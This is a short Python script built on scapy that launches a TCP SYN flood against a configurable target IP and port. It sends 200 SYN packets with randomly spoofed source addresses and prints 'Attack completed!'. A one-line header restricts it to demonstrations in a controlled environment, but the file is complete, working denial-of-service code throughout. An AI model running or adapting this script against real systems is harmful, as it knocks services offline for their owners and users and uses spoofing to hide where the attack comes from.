#caution only for a demonstration use in controlled environment only !!!!!!

from scapy.all import *
import random

# Configuration
TARGET_IP = "192.168.56.103"  # Change to the target VM's IP
TARGET_PORT = 80           # Target port (e.g., web server, SSH)
PACKET_COUNT = 200        # Number of packets to send

print(f"Launching TCP SYN flood attack on {TARGET_IP}:{TARGET_PORT}")

for _ in range(PACKET_COUNT):
    # Generate a spoofed source IP
    src_ip = f"192.168.1.{random.randint(2, 254)}"

    # Create and send a SYN packet
    send(IP(src=src_ip, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=TARGET_PORT, flags="S"), verbose=False)

print("Attack completed!")
